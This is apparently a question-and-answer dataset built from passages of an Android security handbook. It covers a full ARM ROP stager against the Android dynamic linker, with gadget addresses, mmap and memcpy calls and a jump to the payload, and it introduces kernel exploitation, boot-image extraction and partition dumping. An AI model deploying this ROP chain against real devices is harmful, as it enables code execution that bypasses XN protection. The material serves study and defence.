the current stack.\nBy pivoting the stack pointer to point into entirely user-controlled data, you\ncan now proceed to craft a ROP chain of suffi cient length to allocate executable\nmemory, copy the payload there, and transfer control fl ow to the native code.\nExecuting Arbitrary Code from a New Mapping\nNow that you control the stack pointer and consequently also the contents of\nthe stack, you can provide list of gadget addresses to be sequentially executed.\nBecause your overall choice of gadgets from the linker is limited and construct-\ning a new target-specifi c ROP chain for each payload is cumbersome, you fol-\nlow the common approach of creating a generic chain that allocates executable\nmemory and executes any native code there. Such a chain is commonly referred\nto as an ROP stager.\nThe fi rst goal is to allocate executable memory to work with. This is how you\nexecute arbitrary code despite the XN protection. Pages are allocated with the\nmmap system call on Linux. Fortunately, the linker contains a full copy of the\nBionic mmap implementation. This copy resides at 0xb0001678 in the example\nlinker. The mmap function expects six arguments. Per the Android Embedded\nApplication Binary Interface (EABI), the fi rst four arguments are passed in r0\nthrough r3 and the last two are pushed onto the stack. Therefore you need a\nseparate gadget initializing r0 to r3 to your desired values. One such gadget is\nthe following:\n.text:B00038CA POP {R0-R4,PC}\nc09.indd 01:20:31:PM 02/24/2014 Page 303\n304 Chapter 9 ■ Return Oriented Programming\nThe mmap function and this gadget can then be combined to call mmap with\narbitrary parameters. This allows allocating executable memory, to which your\nnative code can be copied and then executed.\nHowever, note that the entire mmap function is invoked, and it in turn returns\nto the contents of lr! It is therefore imperative to set lr to a gadget that advances\nthe stack pointer over the two stack arguments and then loads pc from the stack.\nAdvancing the stack pointer by eight bytes can be accomplished using a pop of\ntwo registers; therefore this Thumb gadget can be used:\n.text:B0006544 POP {R4,R5,PC}\nWhen using the pivot gadget introduced earlier, lr can be set to 0xb0006545\nas part of the pivot already. Otherwise a gadget setting lr from the stack must\nbe inserted at the beginning of the ROP chain.\nAlthough mmap usually chooses the address to allocate memory at for you, there\nare special fl ags that allow allocating at a fi xed address. This makes developing\nan ROP chain easier; as a result, mmap, which normally holds the address, can\nbe discarded. Instead, the statically chosen address can be hard-coded in other\nplaces of the ROP chain. More details about the mmap arguments are available\nfrom its man page. The static address chosen here is 0xb1008000, which is a\nfair bit after the linker in a typically unused address range. This results in the\nfollowing fi rst part of the ROP chain:\n0xb00038ca # pop {r0-r4,pc}\n0xb0018000 # r0: static allocation target address\n0x00001000 # r1: size to allocate = one page\n0x00000007 # r2: protection = read, write execute\n0x00000032 # r3: flags = MAP_ANON | MAP_PRIVATE | MAP_FIXED\n0xdeadbeef # r4: don’t care\n0xb0001678 # pc: __dl_mmap, returning to lr = 0xb006545\n0xffffffff # fifth parameter on stack: fd = -1\n0x00000000 # sixth parameter on stack: offset = 0\n0xdeadc0de # next gadget’s address\nAfter executing mmap, lr points into mmap itself because it invokes a subroutine\nand thereby sets lr to the address following that subroutine invocation. This is\nimportant if later gadgets return to lr like mmap did.\nAt this point, the memory to execute the native code has been allocated but\ncurrently contains just zeroes. The next step is to copy the payload into that\nmemory allocation and transfer the control there. Copying the memory can be\nachieved with the linker’s internal copy of memcpy. However, even if a pointer to\nc09.indd 01:20:31:PM 02/24/2014 Page 304\nChapter 9 ■ Return Oriented Programming 305\nthe native code was available in a register at the control fl ow hijack, that register\nis very well clobbered now. It is usually possible to save the pointer value and\nretrieve it later, but not always. In this case study, you instead abuse a specifi c\nproperty of adjacent WebKit strings.\nThe data structure used to represent strings in WebKit contains, among\nother elements, a pointer to the actual string data. Figure 9-7 depicts a concrete\nexample of this data structure. By splitting the ROP chain across the boundary\nof two strings, it is possible to take advantage of the data pointer. The fi rst part\nof the ROP chain can pop enough data off of the stack (currently pointing into\nthe fi rst string) to load the data pointer into a register and continue the ROP\nchain from the second string’s contents. Figure 9-7 shows how the string header\nmemory overlaps what will be loaded into registers:\npc 0×b0005915 pop {r0−r6, pc}\nr0\nHeap Header\nr1\nr2 m_refCount\nr3 m_length\nr4 m_data8 StringImpl\nr5 union\nr6 m_hashAndFlags\npc\nc09.indd 01:20:31:PM 02/24/2014 Page 305\ntegdaG\ntxen\nretniop\n0\n0×3023\n0×88\n0×1802\n0×910674\n0\n0\n0×deadbeef\nFigure 9-7: Pop over string header\nFor your purposes, it will be useful to have the string pointer in r4. This is\nequivalent to ending the fi rst string in the address of a pop gadget that fi rst\npops the heap header and string size and reference count into r0 to r3, and then\nthe actual pointer into r4. If a higher register is desired, padding at the end of\nthe fi rst string can be introduced. There are two more header elements to be\nskipped, so the optimal gadget (again, a Thumb gadget) is the following:\n.text:B0005914 POP {R0-R6,PC}\n306 Chapter 9 ■ Return Oriented Programming\nAlso the other parameters for mmap need to be surgically set up. First, you\nset up r0, the destination of the copy. There is a gadget that also fi xes up lr at\nthe same time:\n.text:B000131C LDMFD SP!, {R0,LR}\n.text:B0001320 BX LR\nBecause no stack parameters need to be cleaned up in the following gadgets,\nlr can simply be pointed to a gadget that just fetches the next pc from the stack.\nNext, r2 must be loaded with the length to copy. Also, r3 needs to point to\nsome writable memory later. You reuse your static allocation for this location.\nAccordingly the next gadget is:\n.text:B0001918 LDMFD SP!, {R2,R3}\n.text:B000191C BX LR\nNote that the bx lr is equivalent to a pop {pc} now. With r3 pointing to valid\nmemory, the following Thumb gadget for moves r4—which still holds the pointer\nto the second string’s contents—into r1:\n.text:B0006260 MOV R1, R4\n.text:B0006262 B loc_B0006268\n…\n.text:B0006268 STR R1, [R3]\n.text:B000626A B locret_B0006274\n…\n.text:B0006274 POP {R4-R7,PC}\nThe resulting second part of the ROP chain looks like the following:\n0xb0005915 # pop over heap and string headers, pointer goes into r4\n↓ second string starts here\n0xb000131c # pop {r0, lr}; bx lr\n0xb0018000 # r0: copy destination = allocation address\n0xb0002ab0 # lr: address of pop {pc}\n0xb0001918 # pop {r2, r3, pc}\n0x00001000 # r2: copy length = one page\n0xb0018000 # r3: scratch memory = allocation address\n0xb0006261 # r1 <- r4 ([r3] <- r4, pop {r4-r7})\n0xdeadbeef # r4: don’t care\n0xdeadbeef # r5: don’t care\nc09.indd 01:20:31:PM 02/24/2014 Page 306\nChapter 9 ■ Return Oriented Programming 307\n0xdeadbeef # r6: don’t care\n0xdeadbeef # r7: don’t care\n0xdeadc0de # pc: next gadget’s address\nNow, all register arguments to memcpy have been set and lr points to a\npop {pc} sequence, so memcpy returns normally. All that’s left to do is invoke\nmemcpy and then jump to the code. The memory allocation contains the contents\nof the second string, so the native code should immediately follow the ROP\nchain. Consequently, jumping into the allocation must be offset by the length\nof the ROP chain. The resulting full ROP chain is the combination of the two\nprevious parts with the memcpy invocation and lastly the jump into the payload:\n0xb00038ca # pop {r0-r4, pc}\n0xb0018000 # r0: static allocation target address\n0x00001000 # r1: size to allocate = one page\n0x00000007 # r2: protection = read, write execute\n0x00000032 # r3: flags = MAP_ANON | MAP_PRIVATE | MAP_FIXED\n0xdeadbeef # r4: don’t care\n0xb0001678 # pc: __dl_mmap, returning to lr = 0xb006545\n0xffffffff # fifth parameter on stack: fd = -1\n0x00000000 # sixth parameter on stack: offset = 0\n0xb0005915 # pop over heap and string headers, pointer goes into r4\n↓ second string starts here\n0xb000131c # pop {r0, lr}; bx lr\n0xb0018000 # r0: copy destination = allocation address\n0xb0002ab0 # lr: address of pop {pc}\n0xb0001918 # pop {r2, r3, pc}\n0x00001000 # r2: copy length = one page\n0xb0018000 # r3: scratch memory = allocation address\n0xb0006261 # r1 <- r4 ([r3] <- r4, pop {r4-r7})\n0xdeadbeef # r4: don’t care\n0xdeadbeef # r5: don’t care\n0xdeadbeef # r6: don’t care\n0xdeadbeef # r7: don’t care\n0xb00001220 # __dl_memcpy, returns to and preserves lr\n0xb00018101 # Thumb payload jump\nc09.indd 01:20:31:PM 02/24/2014 Page 307\n308 Chapter 9 ■ Return Oriented Programming\nSummary\nIn this chapter, you found out why and how to effectively use ROP on the ARM\narchitecture for achieving arbitrary, native code execution. The primary reason\nto use ROP on recent Android versions is the presence of the XN mitigation,\nwhich prevents an attacker from directly executing regular data in memory.\nEven without the XN mitigation, using ROP can overcome the separate instruc-\ntion and data caches of the ARM architecture.\nDespite the perceived diffi culty of using ROP in the presence of lr-based returns,\ngeneral stack-based ROP is still feasible due to the presence of pop {pc} gadgets.\nEven gadgets ending in a bx lr instruction can be leveraged by cleverly pointing\nlr to a single pop {pc} instruction. Confusing ARM instructions for Thumb pop\n{..., pc} instructions yields even more potential gadgets. The current execu-\ntion mode can be switched by utilizing Interworking support, namely setting\nthe low bit of a gadget address to switch to Thumb mode. Finding gadgets is\nan easy task on RISC architectures like ARM. A simple dead listing produced\nby a disassembler is suffi cient due to fi xed-length instruction encoding.\nA reusable example ROP chain for the Android dynamic linker was provided\nand explained in depth. On Android 4.0 and prior versions, the linker base\naddress was fi xed, so a ROP chain can be crafted without an information leak.\nBecause the dynamic linker must be present in any dynamically linked binary\n(which includes almost all binaries on a default Android build), it can be reused\nfor a variety of attack targets.\nThe next chapter provides you with the tools and techniques needed to develop,\ndebug, and exploit Android’s operating system kernel.\nc09.indd 01:20:31:PM 02/24/2014 Page 308"
  },
  {
    "input": "What is the significance of the Linux kernel in the context of Android operating systems and how can attacking it lead to full control of an Android device?",
    "summary": "The Linux kernel is central to Android's operation, acting as the bridge between software and hardware while enforcing process isolation and managing privileges. This chapter explains how to attack the Android Linux kernel, including configuration, building, and debugging custom kernels, as well as exploiting kernel vulnerabilities. It concludes with case studies showing how three vulnerabilities can be turned into functional exploits.",
    "output": "CHAPTER\n10\nHacking and Attacking the Kernel\nThe Linux kernel is the heart of the Android operating system. Without it,\nAndroid devices would not be able to function. It interfaces user-space software\nwith physical hardware devices. It enforces the isolation between processes and\ngoverns what privileges those processes execute with. Due to its profound role\nand privileged position, attacking the Linux kernel is a straightforward way to\nachieve full control over an Android device.\nThis chapter introduces attacking the Linux kernel used by Android devices.\nIt covers background information about the Linux kernel used on Android\ndevices; how to confi gure, build, and use custom kernels and kernel modules;\nhow to debug the kernel from a post-mortem and live perspective; and how to\nexploit issues in the kernel to achieve privilege escalation. The chapter concludes\nwith a few case studies that examine the process of turning three vulnerabilities\ninto working exploits.\nAndroid’s Linux Kernel\nThe Linux kernel used by Android devices began as Russell King’s project to\nport Linux 1.0 to the Acorn A5000 in 1994. That project predated many of the\nefforts to port the Linux kernel to other architectures such as SPARC, Alpha, or\nMIPS. Back then, the toolchains lacked support for ARM. The GNU Compiler\nCollection (GCC) did not support ARM, nor did many of the supplementary\n309\nc10.indd 11:11:6:AM 02/25/2014 Page 309"
  },
  {
    "input": "What is the significance of the Android Linux kernel being a monolithic kernel and how does this affect its vulnerability to attacks?",
    "summary": "The chapter discusses methods for hacking and attacking the Android kernel, emphasizing its monolithic nature and the importance of kernel security. It covers extracting kernel binaries from stock firmware or devices, configuring and building custom kernels, and using tools like abootimg and binwalk for kernel analysis. The chapter also explains how to debug the kernel using KGDB and ADB, and highlights the challenges and considerations involved in kernel exploitation, including the use of custom modules and the impact of kernel configuration settings.",
    "output": "310 Chapter 10 ■ Hacking and Attacking the Kernel\ntools in the toolchain. As time went on, further work was done on ARM Linux\nand the toolchain. However, it wasn’t until Android that the ARM Linux kernel\nreceived so much attention.\nAndroid’s Linux kernel was not created overnight, though. In addition to\nprevious porting efforts, the Android developers made numerous modifi cations\nto the kernel to support their new operating system. Many of these changes,\nwhich are discussed in Chapter 2, come in the form of custom drivers. Of par-\nticular note is the Binder driver, which is central to Android’s inter-process\ncommunication (IPC). The Binder driver lays the groundwork for communica-\ntion between native and Dalvik components as well as for app building blocks,\nsuch as Intents. Further, the importance of security on a device as sensitive as a\nsmartphone has led to the implementation of numerous hardening measures.\nOne very important aspect of Android’s Linux kernel is that it is a monolithic\nkernel. In contrast to a microkernel architecture where many drivers run in a\nless privileged context (though still more privileged than user-space), everything\nthat is part of the Linux kernel runs entirely in supervisor mode. This property,\nin conjunction with the vast exposed attack surface, makes the kernel an attrac-\ntive target for attackers.\nExtracting Kernels\nIn addition to being a monolithic kernel, Android’s Linux kernel is distributed\nas a monolithic binary. That is, its core consists of only a single binary fi le, often\ncalled a zImage. The zImage binary consists of some bootstrap code, a decom-\npressor, and the compressed kernel code and data. When the system boots, the\ncompressed image is decompressed into RAM and executed. This is a simplistic\noverview of the process and is likely to change in future releases of Android.\nGetting a hold of the binary image that runs on any particular device is\nattractive for a number of reasons. First of all, depending on the confi guration\nused, the kernel build tools embed several interesting things into the image.\nOf particular note are global function and data symbols, which are covered in\nmore detail in the “Extracting Addresses” section later in this chapter. Second,\nit is possible to analyze the code with a tool like IDA Pro to fi nd vulnerabilities\nthrough binary auditing. Third, kernel images can be used to verify the pres-\nence of, or to port an exploit for, a previously discovered vulnerability. Also,\nat a higher level, kernel images can be used to craft custom recoveries for new\ndevices or back port new versions of Android to older unsupported devices. By\nno means is this an exhaustive list of the reasons you might want to get your\nhands on kernel binaries, but it covers the most common cases.\nTo get the binary kernel image, you fi rst need to get an image of the boot\npartition. You can do this using a few methods. The fi rst method, and probably\nthe easiest, is to extract them from stock fi rmware images (sometimes called\nc10.indd 11:11:6:AM 02/25/2014 Page 310\nChapter 10 ■ Hacking and Attacking the Kernel 311\nROMs). The process varies from one original equipment manufacturer (OEM)\nto another, but rest assured that full stock images always contain these binaries.\nAlso, this method is especially useful when trying to achieve initial root access\nto a device.\nThe second method, which requires a rooted device, is to extract them directly\nfrom the target device itself. This method is especially useful for porting or\ntargeting a single device and can still be used in the event that a full stock\nROM is not available. Finally, kernel binaries for many Android Open Source\nProject (AOSP)–supported devices are available under the device directory in\nthe AOSP repository. Experience shows that this is the least reliable method\nbecause these binaries often lag behind or differ from the kernels used on the\nlive device itself. The next section takes a closer look at how you get kernel\nimages using the fi rst two methods.\nExtracting from Stock Firmware\nAcquiring the stock fi rmware for a given device ranges from trivial to quite chal-\nlenging. On the trivial side, Google posts factory images for Nexus devices at\nhttps://developers.google.com/android/nexus/images. Downloading them\ndoes not require any authentication or payment, and they use the common TAR\nand ZIP archive tools to package them. On the challenging side, some OEMs\nuse proprietary fi le formats to distribute their fi rmware. If no open source tool\nis available, accessing the contents may require using the OEMs’ proprietary\ntools. This section explains how to extract the boot.img from various stock\nfi rmware images and then shows you how to extract an uncompressed kernel\nfrom the boot image.\nNexus Factory Images\nKernel binaries for Nexus devices are very easy to obtain because factory images\nare widely available and promptly posted. For example, Android 4.4 was released\nduring the writing of this manuscript. Using the factory image for the Nexus 5,\nyou are able to extract and further analyze the live kernel. After downloading\nthe factory image, decompress it:\ndev:~/android/n5 $ tar zxf hammerhead-krt16m-factory-bd9c39de.tgz\ndev:~/android/n5 $ cd hammerhead-krt16m/\ndev:~/android/n5/hammerhead-krt16m $ ls\nbootloader-hammerhead-HHZ11d.img\nflash-all.bat\nflash-all.sh*\nflash-base.sh*\nimage-hammerhead-krt16m.zip\nradio-hammerhead-M8974A-1.0.25.0.17.img\nc10.indd 11:11:6:AM 02/25/2014 Page 311\n312 Chapter 10 ■ Hacking and Attacking the Kernel\nThe images for the boot and recovery partitions are in the image-hammerhead-\nkrt16m.zip archive as boot.img and recovery.img, respectively. The boot.img\nis the most interesting fi le because it is the kernel used on normal boots:\ndev:~/android/n5/hammerhead-krt16m $ unzip -d img \\\nimage-hammerhead-krt16m.zip boot.img\nArchive: image-hammerhead-krt16m.zip\ninflating: img/boot.img\ndev:~/android/n5/hammerhead-krt16m $ cd img\ndev:~/android/n5/hammerhead-krt16m/img $\nAt this point you have the boot.img, but you still need to get the kernel out.\nThe process for doing that is explained in the “Getting the Kernel from a Boot\nImage” section later in this chapter.\nOEM Stock Firmware\nFinding and extracting kernels from the stock fi rmware images provided by\nOEM vendors is much more convoluted than doing it for Nexus devices. As\nstated previously, each OEM has its own process, tools, and proprietary fi le\nformat for its stock ROMs. Some of these vendors don’t even make their stock\nfi rmware images readily available. Instead, they force you to use their tools for\nimage acquisition. Even those vendors that do provide stock fi rmware images\noften require that you use proprietary tools to extract or fl ash ROMs. This sec-\ntion explains the process of extracting a boot.img from a stock fi rmware image\nfor each of the top six Android device vendors. A list of fl ashing and fi rmware\nextraction tools for some of these OEMs is provided in Appendix A.\nASUS\nASUS makes stock fi rmware images available on its support website in the form\nof zipped blob fi les. A project called “BlobTools” on Github supports extracting\nthe blob, which contains the desired boot.img.\nHTC\nHTC doesn’t routinely release stock fi rmware images, but it has released a\ncouple on its Developer Center site. However, you can fi nd many HTC ROMs\nthrough third-party aggregation sites. These stock images are released as ROM\nUpdate Utilities (RUUs). Luckily, several open source tools that extract the rom.\nzip from within the RUU are available. This alleviates the need for a Windows\nmachine. Inside the rom.zip, the boot_signed.img is a boot.img with an extra\nheader. You can extract it like so:\ndev:~/android/htc-m7-ruu $ unzip rom.zip boot_unsigned.img\n[...]\ninflating: boot_signed.img\ndev:~/android/htc-m7-ruu $ dd if=boot_signed.img of=boot.img bs=256 skip=1\n[...]\nAfter stripping the 256 byte header off, you have the desired boot.img.\nc10.indd 11:11:6:AM 02/25/2014 Page 312\nChapter 10 ■ Hacking and Attacking the Kernel 313\nLG\nLG’s update and recovery infrastructure is complex and proprietary. Its LG\nMobile Support tool even requires using an International Mobile Equipment\nIdentity (IMEI) to query its back-end systems. Luckily, searching for the model\nnumber along with “stock ROM” enables you to easily locate stock ROMs for\nmost devices. To make matters worse, though, LG uses a variety of proprietary\nformats for these ROMs, including BIN/TOT, KDZ, and CAB. Extracting and\nfl ashing these ROMs can be diffi cult. A pair of tools from community developers\neases the process. Starting from a CAB fi le, the process takes three steps. First,\nextract the CAB fi le using one of the few tools that support this compression\nformat. Next, use the binary-only LGExtract tool (Windows only) to extract the\nWDB fi le into a BIN fi le. You can fi nd this tool on the XDA Developers forum\nat http://forum.xda-developers.com/showthread.php?t=1566532. Finally,\nuse LGBinExtract from https://github.com/Xonar/LGBinExtractor to extract\nthe BIN into its components. Inside the BIN directory, there will be a fi le called\n8-BOOT.img. The number may vary, but this is the fi le you’re after. Among the\ntop six OEMs, the process for LG stock fi rmware is by far the most complex.\nMotorola\nLike most OEMs, Motorola does not provide direct downloads for their stock\nfi rmware images. Because there is a need for open access to these images, sev-\neral community sites host them. Older Motorola devices use the proprietary\nSBF fi le format, which can be extracted using sbf_flash’s -x option. The fi le\ncalled CG35.img is the boot.img you seek. Newer devices use a zip fi le (.xml.\nzip) containing the various partition images, including boot.img.\nSamsung\nSamsung distributes stock fi rmware using its proprietary Kies tool. Apart from\nthis tool, the community fi rmware site SamMobile hosts a large number of stock\nROMs for Samsung devices. Samsung stock images use a .tar.md5 fi le extension,\nwhich is just a TAR fi le with a text MD5 appended. These are usually zipped,\ntoo. Extracting the zip and then the TAR produces the desired boot.img fi le.\nSony\nSony distributes stock firmware via its Sony Update Service (SUS) tool.\nAdditionally, a community site called Xperia Firmware hosts fi rmware images\nfor many devices. Sony device fi rmware is distributed in a format called FTF,\nwhich is just a zip fi le. Inside, however, there are proprietary fi les for each com-\nponent of the fi rmware. The fi le that is most interesting to us here is kernel\n.sin. Unlike other OEMs, Sony does not use the boot.img format. The Andoxyde\ntool is large and unwieldy, but it supports extracting the kernel image from this\nfi le. It’s also possible to extract the compressed kernel using binwalk and/or dd.\nBinwalk reveals an ELF binary and two gzip streams. The fi rst gzip stream is\nthe zImage fi le that you ultimately seek to extract.\nc10.indd 11:11:6:AM 02/25/2014 Page 313\n314 Chapter 10 ■ Hacking and Attacking the Kernel\nExtracting from Devices\nUnlike the process of extracting from stock fi rmware, there is little variance in\nthe process of extracting kernel images directly from devices. The process is\nlargely the same regardless of the device type (model, manufacturer, carrier,\netc.). The general process involves fi nding the corresponding partition, dump-\ning it, and extracting it.\nThere are a handful of ways to fi gure out exactly which partition holds the\nboot.img data. First, you can use the by-name directory within the System-On-\nChip (SoC)–specifi c entry in /dev/block/platform:\nshell@android:/data/local/tmp $ cd /dev/block/platform/*/by-name\nshell@android:/dev/block/platform/msm_sdcc.1/by-name $ ls -l boot\nlrwxrwxrwx root root 1970-01-02 11:28 boot -> /dev/block/mmcblk0p20\nWARNING Some devices have an aboot entry in the by-name directory, too. Be\ncareful not to write to this partition in lieu of the boot partition. Doing so may brick\nyour device.\nYou can use this symbolic link directly, or you can use the block device to\nwhich it points. The next method looks at the fi rst several bytes of each partition:\nroot@android:/data/local/tmp/kernel # for ii in /dev/block/m*; do \\\nBASE=`../busybox basename $ii`; \\\ndd if=$ii of=$BASE count=1 2> /dev/null; \\\ndone\nroot@android:/data/local/tmp/kernel # grep ANDROID *\nBinary file mmcblk0p20 matches\nBinary file mmcblk0p21 matches\nUnfortunately this gives you two matches (or possibly more). Remember that\nboth the boot and recovery partitions use the same format. By peering into the\nheader, you can tell the boot partition apart because it has a smaller ramdisk_size\nfi eld than the recovery partition.\nNow you are ready to dump the partition data and pull it down from your\ndevice. Note that dumping an image from the device includes the entire partition\ncontents, including unused areas. Boot images extracted from a stock fi rmware\npackage only includes the data that is necessary. As such, dumped binaries\nwill be bigger (sometimes signifi cantly) than the factory boot.img. To dump a\npartition, use the dd command as shown here:\nroot@android:/data/local/tmp/kernel # dd \\\nif=/dev/block/platform/omap/omap_hsmmc.0/by-name/boot of=cur-boot.img\n16384+0 records in\n16384+0 records out\n8388608 bytes transferred in 1.635 secs (5130647 bytes/sec)\nc10.indd 11:11:6:AM 02/25/2014 Page 314\nChapter 10 ■ Hacking and Attacking the Kernel 315\nroot@android:/data/local/tmp/kernel # chmod 644 *.img\nroot@android:/data/local/tmp/kernel #\nAfter dumping an image of the boot partition to the cur-boot.img fi le, use\nchmod to allow the Android Debug Bridge (ADB) user to pull the images from\nthe device. You then pull the images down to your development machine using\nADB as follows:\ndev:~/android/src/kernel/omap $ mkdir staging && cd $_\ndev:~/android/src/kernel/omap/staging $ adb pull \\\n/data/local/tmp/kernel/cur-boot.img\n2379 KB/s (8388608 bytes in 3.442s)\nThe fi nal step is extracting the kernel from the obtained boot image.\nGetting the Kernel from a Boot Image\nRecall that Android devices typically have two different modes where they will\nboot a Linux kernel. The fi rst mode is the normal boot process, which uses the\nboot partition. The second mode is for the recovery process, which uses the\nrecovery partition. The underlying fi le structure for both of these partitions is\nidentical. They both contain a short header, a compressed kernel, and an initial\nramdisk (initrd) image. The compressed kernel used during normal boots is\nthe most security critical, and thus is the most interesting to obtain.\nInternally, the boot.img and recovery.img fi les are composed of three pieces.\nThe fi le begins with a header used to identify the fi le format and provide basic\ninformation about the rest of the fi le. For more information about the structure of\nthis header, consult the system/core/mkbootimg/bootimg.h fi le within the AOSP\nrepository. The page_size entry in this structure is rather important because\nthe kernel and initrd images will be aligned on block boundaries of this size.\nThe compressed kernel is located on the next block boundary immediately\nfollowing the header. Its size is stored in the kernel_size member of the header\nstructure. At the next block boundary, the initrd image begins.\nExtracting these pieces manually can be quite tedious. The mkbootimg utility\nfrom the AOSP is used when building full system images from source, but it\ndoes not support extracting images. To extract images, the abootimg tool was\ncreated based on mkbootimg. It works quite well for unpacking the image fi le,\nas shown here:\ndev:~/android/n5/hammerhead-krt16m/img $ mkdir boot && cd $_\ndev:~/android/n5/hammerhead-krt16m/img/boot $ abootimg -x ../boot.img\nwriting boot image config in bootimg.cfg\nextracting kernel in zImage\nextracting ramdisk in initrd.img\nNow you have the zImage fi le that you’re after.\nc10.indd 11:11:6:AM 02/25/2014 Page 315\n316 Chapter 10 ■ Hacking and Attacking the Kernel\nDecompressing the Kernel\nDoing further analysis on a kernel binary requires decompressing it. The Linux\nkernel supports three different compression algorithms: gzip, lzma, and lzo.\nBy and large, a majority of Android device kernels are compressed using the\ntraditional gzip algorithm. The Linux kernel contains a script called scripts/\nextract-vmlinux, which unfortunately doesn’t work on Android kernels. As\nsuch, you must decompress the kernel manually. Thankfully, the binwalk tool\nmakes this process much easier:\ndev:~/android/n5/hammerhead-krt16m/img/boot $ binwalk zImage | head\n[...]\n18612 0x48B4 gzip compressed data, from Unix, NULL\ndate: Wed Dec 31 18:00:00 1969, max compression\n[...]\ndev:~/android/n5/hammerhead-krt16m/img/boot $ dd if=zImage bs=18612 \\\nskip=1 | gzip -cd > piggy\nThe second command above pipes the output from dd to the gzip command,\nwhich gives you the uncompressed kernel binary image. With this image in hand,\nyou can extract details from it or analyze the code in IDA Pro. Later sections\nof this chapter discuss how to extract specifi c information from uncompressed\nkernel binaries.\nRunning Custom Kernel Code\nWhen hacking and attacking the kernel, it is tremendously useful to be able\nto introduce new code. You can use custom kernel modules to instrument the\nkernel to monitor existing behavior. Changing the kernel confi guration allows\nenabling powerful features like remote debugging. In any case, changing the\nkernel’s code without an exploit requires using the Android and Linux kernel\ntools to compile the new code. This section walks through the process of obtain-\ning the kernel source code, setting up the build environment, confi guring the\nkernel, building custom modules and kernels, and loading your new code onto\nboth AOSP-based and OEM-provided Android devices. This chapter provides\nrelevant examples using an AOSP-based Galaxy Nexus and the Sprint Samsung\nGalaxy S III.\nObtaining Source Code\nBefore you can build custom modules or a kernel for your device, you must\nobtain the source code. The method for obtaining the code varies depending\nc10.indd 11:11:6:AM 02/25/2014 Page 316\nChapter 10 ■ Hacking and Attacking the Kernel 317\non who is responsible for the kernel for a particular device. Google hosts kernel\nGit repositories for AOSP-supported Nexus devices. On the other hand, OEMs\nuse various methods to distribute their kernel source. Because the Linux kernel\nis distributed under version 2 of the GNU Public License (GPL), vendors are\nlegally obligated to release their source code, including customizations.\nNOTE When unable to locate the kernel source code, contact the vendor directly\nand request that the source be made available. If needed, remind them of their legal\nobligation to do so in compliance with the Linux kernel’s GPL license.\nIn most cases, obtaining the kernel source for a particular device is straight-\nforward. However, in some cases it is not possible. On several occasions, both\nOEMs and Google have been slow to provide kernel source for newer devices.\nGenerally, patience pays off as few devices remain without kernel source avail-\nability indefi nitely.\nGetting AOSP Kernel Source\nGoogle’s Nexus line of Android devices represents the company’s reference\nimplementation primarily intended for use by developers. Source code is available\nfor nearly every component in the system. The kernel is no exception. As such,\ngetting source code for Nexus devices is fairly straightforward. Figuring out\nexactly which kernel source a device uses is easy, but it isn’t a one-step process.\nWithin AOSP, there are two specifi c places to fi nd kernel-related information.\nThe fi rst contains information about a particular support device, or closely\nrelated family of devices. The second contains several different kernel source\ntrees. This section covers how to leverage these places to get the exact kernel\nsource needed for the remainder of the chapter, which uses a Galaxy Nexus\nrunning Android 4.2.2 for illustrative purposes.\nGoogle hosts device-specifi c repositories in the device directory in the AOSP\ntree. These repositories include things such as Makefiles, overlays, header fi les,\nconfi guration fi les, and a kernel binary named kernel. This fi le is particularly\ninteresting as its history tracks which sources were used to build it. Google\nprovides information about these repositories in the AOSP documentation at\nhttp://source.android.com/source/building-kernels.html. Commit infor-\nmation for the kernel fi le in these repositories, as well as the documentation,\ntends to lag behind the release of new devices. As such, these repositories are\ntypically only useful for mapping a particular device to its SoC tree. Figure 10-1\nprovides a mapping of several AOSP-supported devices to their SoC, and thus\nits kernel source repository.\nc10.indd 11:11:6:AM 02/25/2014 Page 317\n318 Chapter 10 ■ Hacking and Attacking the Kernel\nModel SoC\nNexus 7 2013 Wi-Fi MSM\nNexus 7 2013 Mobile MSM\nNexus 10 Exynos 5\nNexus 4 MSM\nNexus 7 2012 Wi-Fi Tegra\nNexus 7 2012 Mobile Tegra\nGalaxy Nexus OMAP\nGalaxy Nexus CDMA/LTE OMAP\nPandaboard OMAP\nMotorola Xoom Verizon Tegra\nMotorola Xoom Wi-Fi Tegra\nNexus S Exynos 3\nNexus S 4G Exynos 3\nFigure 10-1: Mapping of AOSP devices to SoC\nAs mentioned in Chapter 3, it is usually possible to determine the SoC used\nby a device from entries under the /dev/block/platform directory.\nshell@android:/dev/block/platform $ ls\nomap\nAfter you determine the SoC manufacturer, you can obtain the kernel source\nfrom Google using Git. AOSP contains one Git repository for each supported SoC.\nFigure 10-2 shows the repository name for each Google-hosted SoC kernel tree.\nSoC Kernel Name\nMSM msm\nExynos 5 exynos\nTegra tegra\nOMAP omap\nExynos 3 samsung\nEmulator goldfish\nFigure 10-2: Kernel names for each SoC\nFrom the Figure 10-1, you can see that the target device is based on the OMAP\nSoC. The following excerpt shows the commands needed to clone the corre-\nsponding kernel source.\ndev:~/android/src $ mkdir kernel && cd $_\ndev:~/android/src/kernel $ git clone \\\nhttps://android.googlesource.com/kernel/omap.git\nCloning into 'omap'...\nremote: Counting objects: 41264, done\nremote: Finding sources: 100% (39/39)\nremote: Getting sizes: 100% (24/24)\nc10.indd 11:11:6:AM 02/25/2014 Page 318\nChapter 10 ■ Hacking and Attacking the Kernel 319\nremote: Compressing objects: 100% (24/24)\nReceiving objects: 100% (2117273/2117273), 441.45 MiB | 1.79 MiB/s, done\nremote: Total 2117273 (delta 1769060), reused 2117249 (delta 1769054)\nResolving deltas: 100% (1769107/1769107), done.\nAfter the clone operation completes, you have a repository on the master\nbranch. However, notice that there are no fi les in the working copy.\ndev:~/android/src/kernel $ cd omap\ndev:~/android/src/kernel/omap $ ls\ndev:~/android/src/kernel/omap $\nThe master branch of AOSP kernel trees is kept empty. In a Git repository, the\n.git directory contains everything necessary to create a working copy from any\npoint in development history. Checking out the master branch is a nice shortcut\nto delete all fi les that are already tracked, thereby freeing up storage space.\nThe fi nal step in obtaining the kernel source for an AOSP-supported device\ninvolves checking out the correct commit. As stated previously, the commit\nlogs for the kernel fi le in the device directory often lag behind live kernels. To\nsolve this problem, you can use the version string extracted from /proc/ver-\nsion or a decompressed kernel image. The following ADB shell session excerpt\ndemonstrates the process on the reference device.\nshell@android:/ $ cat /proc/version\nLinux version 3.0.31-g9f818de (android-build@vpbs1.mtv.corp.google.com)\n(gcc version 4.6.x-google 20120106 (prerelease) (GCC) ) #1 SMP PREEMPT\nWed Nov 28 11:20:29 PST 2012\nIn this excerpt, the relevant detail is the seven-digit hex value following\n3.0.31-g in the kernel version: 9f818de. Using this value, you are able to check\nout the exact commit needed.\ndev:~/android/src/kernel/omap $ git checkout 9f818de\nHEAD is now at 9f818de... mm: Hold a file reference in 